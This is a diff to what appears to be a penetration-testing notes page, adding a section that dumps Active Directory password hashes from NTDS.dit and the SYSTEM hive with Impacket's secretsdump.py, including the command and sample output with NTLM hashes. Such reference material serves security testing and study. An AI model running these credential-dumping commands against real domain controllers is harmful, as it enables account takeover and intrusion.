@@ -230,6 +230,28 @@ Henk:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 [*] Cleaning up... 
 ```
 
+### Extract accounts from NTDS.dit
+
+Also check [NTDS.ditExtract]({{< ref "ntds-dump" >}}).
+
+Required files:
+
+* NTDS.dit (`C:\Windows\NTDS\ntds.dit`)
+* SYSTEM (`C:\Windows\System32\config\SYSTEM`)
+
+```plain
+$ secretsdump.py -system SYSTEM -ntds NTDS.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract -just-dc-ntlm -user-status -history
+Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation
+
+[*] Target system bootKey: 0xa78f11b1234567893f2b6ea8613764
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 640afd6c9912345678977329f09
+[*] Reading and decrypting hashes from ntds.dit
+john_do:19530:aad3b435b51404eeaad3b435b51404ee:6ed6a61234567898f78076f844::: (status=Enabled)
+john_do_adm:19530:aad3b435b51404eeaad3b435b51404ee:2b311d396123456789f280077beee::: (status=Disabled)
+```
+
 ### NTLMrelayx.py
 
 For every connection received, this module will try to relay that connection
